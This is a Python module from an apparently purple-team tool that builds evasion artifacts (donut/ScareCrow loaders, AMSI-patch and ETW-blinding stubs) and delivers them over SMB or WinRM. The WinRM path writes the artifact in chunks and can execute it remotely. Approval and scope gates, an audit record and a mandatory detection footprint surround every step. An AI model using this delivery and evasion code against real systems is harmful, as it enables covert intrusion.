"""Bespoke evasion engine (build #4, item C; delivery added build #13 part 2).

GENERATE-ONLY WAS REMOVED ON PURPOSE. Until build #13 this engine carried no delivery or
execution primitive at all and two tests enforced it. That property is gone by decision,
following the precedent set when the Sliver server and the pivot/DNS listeners went from
refused-outright to gated-and-allowed: the GATE, not the absence of the feature, is the
control. The artifact always landed in a loot directory mounted into the sandbox and sitting on
the host, so an operator could already copy it out and run it by hand; what changed is that the
step no longer has to leave the tool.

What replaces it, and is asserted just as hard by test_evasion_safety:
  * :func:`deliver`'s ``kind`` is a CLOSED SET (winrm | smb) and no request field is a command.
    A free-form delivery string would be a general execution path with none of the gates.
  * The artifact is a program ONLY on the gated WinRM invoke path. There is deliberately no
    sandbox invoke — detonating the payload inside HackPit's own box is never what the operator
    wants — so it is REFUSED, not merely unimplemented.
  * The WinRM send goes THROUGH ``executor.send_windows_scripts``, never around it. This module
    does not touch ``winrm_transport``: only the executor and the router may, and the right
    answer to that rule is to use the gated execution point, not to be added to its allow-list.

CONTAINMENT (mirrors cockpit/repeater.py and cockpit/sliver.py):

* :func:`generate` runs the generators (donut / ScareCrow) as argv-only ``docker exec`` inside
  a container resolved from the execution MODE. The container is a code constant, never a
  request field, and no shell parses any request value.
* :func:`generate` still NEVER runs the artifact — the produced path is never argv[0] of
  anything there, and that assertion is unchanged.
* HUMAN-invoked through the main.py endpoint only. The orchestrator / agent / loop modules
  have ZERO code path here (AST-asserted by test_evasion_safety.py).
* GATED: every generate builds an ExecRequest and runs the SAME gates a one-shot command run
  does — ``executor.validate_request`` (approval + scope + red-confirm via ``dangerous_ack``).
* AUDITED: every generate is recorded through ``runstore.save_run``.

FORCED HONESTY (build #4, D-guard). This is the load-bearing part of the design, and the
reason the OPSEC channel's sensor-tamper ban was lifted in Task 1. Every result carries BOTH:

  1. the blue-view detection footprint for the artifact's technique, and
  2. an OPSEC note whose ``still_recorded`` names what catches it anyway.

A result missing either is a bug, not a degraded mode: :func:`generate` RAISES rather than
return a footprint-less artifact. The footprint is never suppressible — there is no flag to
turn it off, and the HTTP layer returns it in the same object as the artifact path. An
evasion tool that told you only how to be quieter, and never what still sees you, would be an
evasion how-to; this is the thing that keeps it a purple-team tool.
"""
from __future__ import annotations

import base64
import subprocess
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from pydantic import BaseModel, Field, field_validator

from cockpit import config, executor, loot, runstore
from cockpit.models import ExecRejected, ExecRequest, RunRecord
from detection import resolver as det

_TEMPLATES = Path(__file__).resolve().parent / "templates"

# Every technique this engine can emit, and the DETECTION SPEC that describes what a defender
# sees when the resulting artifact runs. These spec keys are curated in detection/catalog.py
# (build #4) precisely so this table resolves to a real footprint rather than a near-miss —
# `_honest_footprint` fails loudly if a key here stops resolving.
TECHNIQUES: dict[str, str] = {
    "donut-pack": "evasion_packed_loader",
    "scarecrow-loader": "evasion_packed_loader",
    "amsi-patch": "evasion_amsi_patch",
    "etw-blind": "evasion_etw_blind",
}

# Techniques that produce a text stub rather than a compiled artifact.
_STUB_TECHNIQUES = {"amsi-patch": "amsi_patch.ps1.tmpl", "etw-blind": "etw_blind.ps1.tmpl"}

_MAX_OUTPUT = 20_000


def _now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


class EvasionError(RuntimeError):
    """The engine could not honour its own contract. Never raised for a merely failed build."""


class EvasionRefused(RuntimeError):
    """A gate refused the generation. ``gate`` names which one, mirroring SliverRefused."""

    def __init__(self, reason: str, gate: str = "") -> None:
        super().__init__(reason)
        self.reason = reason
        self.gate = gate


class EvasionRequest(BaseModel):
    """One generate request. ``techniques`` drives both the argv and the honest footprint."""

    # There is deliberately no `target_os`. One was accepted and surfaced as a panel dropdown
    # but never read by any code here — donut emits Windows PE shellcode and `_scarecrow_argv`
    # hardcodes a Windows `-Loader binary`, so the field could only ever have misled. If a
    # cross-compile target is wanted later it has to actually reach the argv.
    payload_path: str = ""
    techniques: list[str] = Field(default_factory=list)
    target: str = ""
    engagement_id: str | None = None
    session_id: str | None = None
    step_id: str | None = None
    approved: bool = False
    dangerous_ack: bool = False

    @field_validator("techniques")
    @classmethod
    def _known_techniques(cls, v: list[str]) -> list[str]:
        if not v:
            raise ValueError("at least one technique is required")
        unknown = [t for t in v if t not in TECHNIQUES]
        if unknown:
            raise ValueError(f"unknown technique(s): {', '.join(unknown)}")
        # EXACTLY ONE — this is a forced-honesty rule, not a convenience.
        #
        # Every describing helper below reads techniques[0] and only techniques[0]
        # (`_honest_footprint`, `render_stub`, `_artifact_name`), while `_needs_generator`
        # reads the WHOLE list. A mixed request therefore used to BUILD one thing and
        # DESCRIBE another: ["amsi-patch", "scarecrow-loader"] ran ScareCrow and handed the
        # resulting loader back carrying the AMSI-patch footprint. Two stub techniques
        # silently dropped the second. Both are the contract in the module docstring failing
        # quietly, which is worse than refusing.
        #
        # A list stays the wire shape (the result echoes it, and one day a build may legitimately
        # compose techniques) — but until the honest half can describe a COMBINATION, more than
        # one entry is refused rather than half-honoured.
        if len(v) > 1:
            raise ValueError(
                "exactly one technique per build — a build carries the footprint of ONE "
                f"technique, so it may not name {len(v)}: {', '.join(v)}"
            )
        return v

    @field_validator("payload_path")
    @classmethod
    def _no_flag_lookalike(cls, v: str) -> str:
        # A value that leads with '-' would be read as an option by the generator.
        if v.startswith("-"):
            raise ValueError("payload_path must not start with '-'")
        return v


class EvasionResult(BaseModel):
    """An artifact plus, MANDATORILY, the defender's view of it.

    ``footprint`` and ``opsec_note`` are not optional and are not suppressible. See the module
    docstring: a result carrying an artifact but no honest footprint is a bug.
    """

    run_id: str
    artifact_path: str
    techniques: list[str]
    mode: str
    exit_code: int | None = None
    stdout: str = ""
    stderr: str = ""
    footprint: dict[str, Any]
    opsec_note: dict[str, Any]
    stub: str = ""


# --------------------------------------------------------------------------- #
# PURE helpers — argv construction and template rendering. No execution, no I/O
# beyond reading the packaged templates. Safe for the UI/preview path.
# --------------------------------------------------------------------------- #
def _artifact_name(run_id: str, techniques: list[str]) -> str:
    return f"evasive-{run_id}.bin" if _needs_generator(techniques) else f"evasive-{run_id}.ps1"


def _needs_generator(techniques: list[str]) -> bool:
    """True when a technique needs donut/ScareCrow rather than a text stub."""
    return any(t not in _STUB_TECHNIQUES for t in techniques)


def _donut_argv(req: EvasionRequest, out_path: str) -> list[str]:
    return ["donut", "-i", req.payload_path, "-o", out_path]


def _scarecrow_argv(req: EvasionRequest, out_path: str) -> list[str]:
    return ["ScareCrow", "-I", req.payload_path, "-Loader", "binary", "-O", out_path]


def _generator_argv(req: EvasionRequest, out_path: str) -> list[str]:
    """PURE: the generator invocation. Never includes the produced artifact as argv[0]."""
    if "scarecrow-loader" in req.techniques:
        return _scarecrow_argv(req, out_path)
    return _donut_argv(req, out_path)


def render_stub(technique: str) -> str:
    """The text stub for a stub technique. PURE apart from reading the packaged template.

    Every template carries a header naming what still records the technique — the same
    honesty invariant the OPSEC channel enforces, applied to the artifact itself so it
    survives being copied out of HackPit.
    """
    name = _STUB_TECHNIQUES.get(technique)
    if name is None:
        raise EvasionError(f"{technique!r} does not produce a stub")
    return (_TEMPLATES / name).read_text(encoding="utf-8")


def _gate_request(req: EvasionRequest) -> ExecRequest:
    """The ExecRequest the real gates run against.

    Surface: the GENERATOR NAME (which drives the danger heuristic — both `donut` and
    `scarecrow` are in allowlist._FRAMEWORKS, so a build always demands the red-confirm) plus
    the DECLARED TARGET (which the scope gate checks).

    Local file paths are deliberately NOT in the gate surface. They are not scope objects,
    and feeding them in is actively harmful: the target extractor reads any dotted token as a
    hostname, so `-o evasive-<id>.bin` was refused as an out-of-scope "host". Nothing is
    weakened by leaving them out — the only network-facing value a generate can carry is
    ``target``, and it is gated.
    """
    target = req.target
    if not target and not req.engagement_id:
        # LAB. Building an artifact has no network target, but the lab's target-lock requires
        # the command to name the lab. Naming it explicitly is the honest way to satisfy that:
        # it does not widen anything, because the lab host is the ONLY value the lock accepts.
        #
        # ENGAGEMENT mode is deliberately NOT symmetrical here, and the earlier claim that an
        # empty target "falls through to the scope gate and is refused" was WRONG: outside lab
        # mode `executor.check_target_lock` permits a command that names no host at all (see its
        # docstring — `nmap -iL targets.txt` hides its hosts in a file, so refusing on absence
        # protected nothing). With no target the ExecRequest carries empty args and the scope
        # gate has nothing to check, so it passes. Nothing is weakened by that: a generate
        # reaches no host, `target` feeds only the audit record, and the one value that COULD
        # be network-facing is `req.target` — which, when present, is gated exactly as it
        # should be. Regression-locked in test_evasion.py.
        target = config.LAB_TARGET_HOST
    return ExecRequest(
        command=_generator_argv(req, "")[0],
        args=[target] if target else [],
        approved=req.approved,
        dangerous_ack=req.dangerous_ack,
        engagement_id=req.engagement_id,
        session_id=req.session_id,
        step_id=req.step_id,
    )


def validate_build(req: EvasionRequest):
    """The gate verdict for this request, without generating anything. PURE."""
    return executor.validate_request(_gate_request(req))


# --------------------------------------------------------------------------- #
# the forced-honesty half
# --------------------------------------------------------------------------- #
def _honest_footprint(techniques: list[str]) -> tuple[dict[str, Any], dict[str, Any]]:
    """The blue footprint + OPSEC note for the artifact. Raises if either is unavailable.

    Deliberately built with ``allow_llm=False``: the honest half of this engine must come from
    the curated map, not from a model that might be unreachable or might hedge.
    """
    spec_key = TECHNIQUES[techniques[0]]
    from detection import catalog

    spec = catalog.SPECS.get(spec_key)
    if spec is None:  # a TECHNIQUES entry that no longer resolves is a wiring bug
        raise EvasionError(f"no detection spec for {spec_key!r}; refusing to emit an artifact")

    match = catalog.Match(spec=spec, signals=(), matched_on="evasion-technique")
    fp = det._grounded(techniques[0], [], match)
    opsec = det._opsec_grounded(spec_key)

    if not (fp and fp.get("activity")):
        raise EvasionError("refusing to emit an artifact without a blue-view footprint")
    if not (opsec and str(opsec.get("still_recorded") or "").strip()):
        raise EvasionError(
            "refusing to emit an artifact without an OPSEC note naming what still records it"
        )
    # The channel's own guard, applied to our own data. A curated note that lost its honesty
    # marker is a data bug and must fail the build, not ship.
    det.assert_opsec_is_separate(opsec, f"evasion generate ({spec_key})")
    return fp, opsec


# --------------------------------------------------------------------------- #
# the entry point
# --------------------------------------------------------------------------- #
def generate(req: EvasionRequest) -> EvasionResult:
    """Produce ONE evasion artifact. Gated, scope-checked, audited, and honest.

    Never runs or deploys what it builds. Raises :class:`EvasionRefused` when a gate refuses,
    and :class:`EvasionError` when the engine cannot honour its forced-honesty contract. A
    generator that merely EXITS NON-ZERO is a failed build, not a refusal: it is recorded and
    returned with its exit code, the same way cockpit/sliver.py treats a failed implant build.
    """
    # The honest half is computed FIRST. If the engine cannot describe what a defender would
    # see, it does not get to build the artifact at all.
    footprint, opsec = _honest_footprint(req.techniques)

    rejected = validate_build(req)
    if rejected is not None:
        raise EvasionRefused(rejected.reason, gate=getattr(rejected, "gate", ""))

    # The engagement can exit between the gate and the resolve. `resolve_mode` refuses rather
    # than silently falling back to LAB (that is the point of EngagementInactive), but it
    # signals that by raising — so catch it and refuse the same way every other gate does,
    # instead of letting it surface as a 500. Mirrors executor.iter_run's handling.
    try:
        resolved = executor.resolve_mode(_gate_request(req))
    except executor.EngagementInactive as exc:
        raise EvasionRefused(str(exc), gate="engagement") from exc
    run_id = uuid.uuid4().hex[:12]
    out_name = _artifact_name(run_id, req.techniques)

    # Placement is delegated to the SAME helper executor.iter_run uses, so this engine can
    # never disagree with the cockpit about where loot goes (and lab, which has no /loot
    # mount, correctly gets a bare filename).
    workdir = loot.workdir_for(resolved.mode, req.engagement_id)
    out_path = f"{workdir}/{out_name}" if workdir else out_name

    started = _now()
    stub = ""
    exit_code: int | None = None
    stdout = stderr = ""

    if _needs_generator(req.techniques):
        argv = ["docker", "exec", resolved.container, *_generator_argv(req, out_path)]
        try:
            proc = subprocess.run(argv, capture_output=True, text=True, timeout=300)
            exit_code, stdout, stderr = proc.returncode, proc.stdout, proc.stderr
        except subprocess.TimeoutExpired:
            exit_code, stderr = None, "the generator timed out"
        except OSError as exc:
            exit_code, stderr = None, f"could not start the generator: {exc}"
    else:
        # A stub technique produces text, not a compiled artifact. It is WRITTEN, never run.
        stub = render_stub(req.techniques[0])
        exit_code = 0

    runstore.save_run(
        RunRecord(
            run_id=run_id,
            command="evasion-generate",
            args=list(req.techniques),
            target=req.target or resolved.target,
            approved=True,
            mode=resolved.mode,
            exit_code=exit_code,
            stdout=stdout[:_MAX_OUTPUT],
            stderr=stderr[:_MAX_OUTPUT],
            started_at=started,
            finished_at=_now(),
            session_id=req.session_id,
            step_id=req.step_id,
        )
    )

    return EvasionResult(
        run_id=run_id,
        # Only claim a path when something was actually written. A non-zero exit or a timeout
        # means the generator produced nothing, and handing back a path to a file that does not
        # exist reads as a successful build in the panel (it even offered a copy button for it).
        artifact_path=out_path if exit_code == 0 else "",
        techniques=list(req.techniques),
        mode=resolved.mode,
        exit_code=exit_code,
        stdout=stdout[:_MAX_OUTPUT],
        stderr=stderr[:_MAX_OUTPUT],
        footprint=footprint,
        opsec_note=opsec,
        stub=stub,
    )


# --------------------------------------------------------------------------- #
# DELIVERY (build #13 part 2) — the deliberate reversal of "generate only".
#
# This package used to carry no delivery or execution primitive at all, and two tests enforced
# it. That property is removed ON PURPOSE, following the precedent set when the Sliver server
# and the pivot/DNS listeners went from refused-outright to gated-and-allowed: the GATE, not
# the absence of the feature, is the control. The artifact already lands in a loot directory
# mounted into the sandbox and sitting on the host, so an operator could always copy it out and
# run it by hand; what changes is that the step no longer has to leave the tool.
#
# WHAT DOES NOT CHANGE: the mandatory footprint. `deliver` computes the honest half FIRST and
# raises rather than act without it, exactly as `generate` does. An evasion tool that told you
# only how to be quieter, and never what still sees you, would be an evasion how-to.
#
# TWO PRIMITIVES, DELIBERATELY SEPARATED. Putting an artifact somewhere and RUNNING it are
# different acts with different blast radii; a single `deploy()` would leave the gate unable to
# tell them apart. There is deliberately NO sandbox invoke — detonating the payload inside our
# own box is never what the operator wants, so it is REFUSED, not merely unimplemented.
# --------------------------------------------------------------------------- #

# A CLOSED SET. `kind` is never a free-form command: a `deliver(command=...)` taking an
# arbitrary delivery string would hand this package a general execution path with none of the
# executor's gates — the exact shape the whole-tree scans exist to catch.
DELIVERY_KINDS: tuple[str, ...] = ("winrm", "smb")

# Raw bytes per chunk. Base64 expands 4/3, so ~3 KiB in is ~4 KiB of command text — well under
# WinRM's per-command ceiling even with the PowerShell wrapper around it. Chunking is NOT
# optional: a truncated payload that reported success would be worse than a failed transfer.
WINRM_CHUNK_BYTES = 3072


class DeliveryRequest(BaseModel):
    """Put a previously-generated artifact on a target, or run it there."""

    kind: str = Field(..., description="winrm | smb — a closed set, never a command.")
    artifact_path: str = Field(..., description="Host path of an artifact a build produced.")
    techniques: list[str] = Field(..., description="The build's technique — carries the footprint.")
    dest: str = Field(..., description="Remote path (winrm) or //host/share (smb).")
    windows_profile_id: str | None = None
    engagement_id: str | None = None
    smb_credential: str = Field("", description="user%pass for smbclient. Never recorded.")
    session_id: str | None = None
    step_id: str | None = None
    approved: bool = False
    dangerous_ack: bool = False
    invoke: bool = Field(False, description="After delivery, RUN it. WinRM only.")

    @field_validator("kind")
    @classmethod
    def _known_kind(cls, v: str) -> str:
        if v not in DELIVERY_KINDS:
            raise ValueError(f"unknown delivery kind {v!r} — known: {', '.join(DELIVERY_KINDS)}")
        return v

    @field_validator("dest", "artifact_path")
    @classmethod
    def _no_flag_lookalike_path(cls, v: str) -> str:
        if v.startswith("-"):
            raise ValueError("a path must not start with '-' — it would be read as an option")
        return v

    @field_validator("techniques")
    @classmethod
    def _one_known_technique(cls, v: list[str]) -> list[str]:
        if len(v) != 1 or v[0] not in TECHNIQUES:
            raise ValueError("exactly one known technique — a delivery carries ONE footprint")
        return v


class DeliveryResult(BaseModel):
    """What was delivered, and MANDATORILY what a defender sees when it lands."""

    run_id: str
    kind: str
    dest: str
    mode: str
    chunks: int = 0
    exit_code: int | None = None
    stdout: str = ""
    stderr: str = ""
    footprint: dict[str, Any]
    opsec_note: dict[str, Any]
    invoked: bool = False


def _delivery_gate_request(req: DeliveryRequest) -> ExecRequest:
    """The ExecRequest the REAL executor gates. Mode follows the delivery kind.

    winrm -> windows mode, target-locked to the profile host.
    smb   -> engagement mode, target-locked to the engagement's program scope, so an
             out-of-scope share is refused at the target gate like any other command.
    """
    if req.kind == "winrm":
        return ExecRequest(
            command="evasion-deliver", args=[req.dest],
            windows_profile_id=req.windows_profile_id,
            approved=req.approved, dangerous_ack=req.dangerous_ack,
            session_id=req.session_id, step_id=req.step_id,
        )
    return ExecRequest(
        command="smbclient", args=[req.dest],
        engagement_id=req.engagement_id,
        approved=req.approved, dangerous_ack=req.dangerous_ack,
        session_id=req.session_id, step_id=req.step_id,
    )


def validate_delivery(req: DeliveryRequest):
    """The gate verdict for a delivery, without delivering anything. PURE.

    The red-confirm is required UNCONDITIONALLY rather than left to the heuristic to notice.
    Delivering or running an artifact built to evade detection is categorically dangerous, and
    build #5's finding was that a gate depending on a classifier spotting a name is a gate a
    rename defeats. So this asks for `dangerous_ack` itself, on top of whatever the heuristic
    decides about the argv.
    """
    if not req.dangerous_ack:
        return ExecRejected(
            reason="delivering or running an evasion artifact always needs the red-confirm "
                   "(dangerous_ack=true) — this does not depend on the heuristic noticing",
            gate="danger",
        )
    if req.invoke and req.kind != "winrm":
        # Refused on the `windows` gate rather than a new one: the honest statement is that
        # invoke REQUIRES the WinRM path, and ExecRejected.gate is a closed Literal shared by
        # every caller. Widening a shared type for one module's convenience would be the wrong
        # trade — the message carries the specificity, the gate stays the executor's vocabulary.
        return ExecRejected(
            reason="there is no sandbox invoke — running the artifact inside HackPit's own "
                   "sandbox detonates it on the operator's box, never the target; invoke is "
                   "only available over WinRM against a Windows profile host",
            gate="windows",
        )
    return executor.validate_request(_delivery_gate_request(req))


def _b64_chunks(data: bytes, size: int = WINRM_CHUNK_BYTES) -> list[str]:
    """Base64 chunks of the artifact. PURE — no I/O, no execution."""
    return [
        base64.b64encode(data[i:i + size]).decode("ascii")
        for i in range(0, len(data), size)
    ]


def winrm_write_script(dest: str, chunk: str, *, first: bool) -> str:
    """The PowerShell for ONE chunk. PURE — builds a string, runs nothing.

    The first chunk truncates and the rest append, so a re-run never concatenates onto a stale
    file. Bytes go through a FileStream rather than Set-Content: Set-Content on a string would
    apply an encoding and newline translation, which corrupts a PE.
    """
    mode = "Create" if first else "Append"
    return (
        "$b=[Convert]::FromBase64String('" + chunk + "');"
        "$s=[IO.File]::Open('" + dest + "',[IO.FileMode]::" + mode + ","
        "[IO.FileAccess]::Write);$s.Write($b,0,$b.Length);$s.Close()"
    )


def winrm_verify_script(dest: str) -> str:
    """PowerShell reporting the delivered file's size. PURE.

    A chunked transfer is only complete when the far side agrees on the length. Reporting
    success on a short write is the failure mode chunking introduces, so it is CHECKED.
    """
    return "(Get-Item -LiteralPath '" + dest + "').Length"


def winrm_invoke_script(dest: str) -> str:
    """PowerShell that RUNS the delivered artifact. PURE — builds a string.

    This is the one place the artifact is a program rather than an output value, and it exists
    only on the gated WinRM path.
    """
    return "& '" + dest + "'"


def smb_argv(req: DeliveryRequest, artifact: str) -> list[str]:
    """The smbclient argv. PURE, and a LIST — no shell, so no request value is ever parsed.

    The credential is passed as `-U user%pass`; the audited record is built from a MASKED copy
    (see `deliver`), so the run store never becomes a key store. Same rule obfuscation.py
    applies to its pre-shared tunnel key.
    """
    argv = ["smbclient", req.dest]
    if req.smb_credential:
        argv += ["-U", req.smb_credential]
    return argv + ["-c", "put " + artifact]


def _masked_argv(argv: list[str]) -> list[str]:
    """argv with any `-U user%pass` value replaced. Masked BY CONSTRUCTION, at the source."""
    out = list(argv)
    for i, tok in enumerate(out):
        if tok == "-U" and i + 1 < len(out):
            out[i + 1] = "***"
    return out


def deliver(req: DeliveryRequest, *, _winrm=None, _run=None) -> DeliveryResult:
    """Put the artifact on the target, and optionally RUN it. Gated, scope-checked, audited.

    Order matters and mirrors `generate`: the honest half is computed FIRST, so an artifact the
    engine cannot describe is never delivered — not even to a scoped, approved, red-confirmed
    target. The footprint is not suppressible and there is no flag to skip it.

    ``_winrm`` / ``_run`` are injection points for the hermetic tests, the way test_winrm
    monkeypatches the transport. Production passes neither.
    """
    footprint, opsec = _honest_footprint(req.techniques)

    rejected = validate_delivery(req)
    if rejected is not None:
        raise EvasionRefused(rejected.reason, gate=getattr(rejected, "gate", ""))

    try:
        resolved = executor.resolve_mode(_delivery_gate_request(req))
    except executor.EngagementInactive as exc:
        raise EvasionRefused(str(exc), gate="engagement") from exc
    except executor.WindowsProfileUnavailable as exc:
        raise EvasionRefused(str(exc), gate="windows") from exc

    run_id = uuid.uuid4().hex[:12]
    started = _now()
    chunks_sent = 0
    exit_code: int | None = 0
    stdout = stderr = ""
    invoked = False
    audit_argv: list[str] = []

    if req.kind == "winrm":
        data = Path(req.artifact_path).read_bytes()
        chunks = _b64_chunks(data)
        # Build the WHOLE sequence, then hand it to the executor as ONE gated act. This module
        # deliberately does NOT touch winrm_transport: `test_winrm_safety` allows only the
        # executor and the router to reach it, and the right answer to that is to go THROUGH
        # the gated execution point rather than around it. See executor.send_windows_scripts.
        scripts = [winrm_write_script(req.dest, c, first=i == 0) for i, c in enumerate(chunks)]
        scripts.append(winrm_verify_script(req.dest))
        if req.invoke:
            scripts.append(winrm_invoke_script(req.dest))

        send = _winrm or executor.send_windows_scripts
        try:
            results = send(_delivery_gate_request(req), scripts)
        except executor.WindowsDeliveryRefused as exc:
            raise EvasionRefused(exc.reason, gate=exc.gate) from exc

        chunks_sent = sum(1 for r in results[:len(chunks)] if r.get("status_code", 1) == 0)
        failed = next((r for r in results if r.get("status_code", 1) != 0), None)
        if failed is not None:
            exit_code, stderr = failed.get("status_code", 1), failed.get("stderr", "")
        elif len(results) > len(chunks):
            # VERIFY. A chunked transfer is only complete when the far side agrees on the
            # length — reporting success on a short write is the failure mode chunking
            # introduces, so it is CHECKED rather than assumed.
            landed = (results[len(chunks)].get("stdout") or "").strip()
            if landed.isdigit() and int(landed) != len(data):
                exit_code = 1
                stderr = (f"short write: {landed} bytes landed of {len(data)} — the artifact on "
                          "the target is TRUNCATED, do not run it")
            else:
                stdout = f"{len(data)} bytes in {chunks_sent} chunk(s)"
                if req.invoke and len(results) > len(chunks) + 1:
                    ran = results[len(chunks) + 1]
                    invoked = True
                    exit_code = ran.get("status_code", 0)
                    stdout += "\n" + (ran.get("stdout") or "")
                    stderr = ran.get("stderr", "")
        audit_argv = ["winrm", req.dest, f"{chunks_sent} chunk(s)"]
    else:
        argv = ["docker", "exec", resolved.container, *smb_argv(req, req.artifact_path)]
        runner = _run or subprocess.run
        try:
            proc = runner(argv, capture_output=True, text=True, timeout=300)
            exit_code, stdout, stderr = proc.returncode, proc.stdout, proc.stderr
            chunks_sent = 1
        except subprocess.TimeoutExpired:
            exit_code, stderr = None, "the delivery timed out"
        except OSError as exc:
            exit_code, stderr = None, f"could not start smbclient: {exc}"
        audit_argv = _masked_argv(argv)

    runstore.save_run(
        RunRecord(
            run_id=run_id,
            command="evasion-deliver",
            args=audit_argv,
            target=req.dest,
            approved=True,
            mode=resolved.mode,
            exit_code=exit_code,
            stdout=stdout[:_MAX_OUTPUT],
            stderr=stderr[:_MAX_OUTPUT],
            started_at=started,
            finished_at=_now(),
            session_id=req.session_id,
            step_id=req.step_id,
        )
    )

    return DeliveryResult(
        run_id=run_id, kind=req.kind, dest=req.dest, mode=resolved.mode,
        chunks=chunks_sent, exit_code=exit_code,
        stdout=stdout[:_MAX_OUTPUT], stderr=stderr[:_MAX_OUTPUT],
        footprint=footprint, opsec_note=opsec, invoked=invoked,
    )
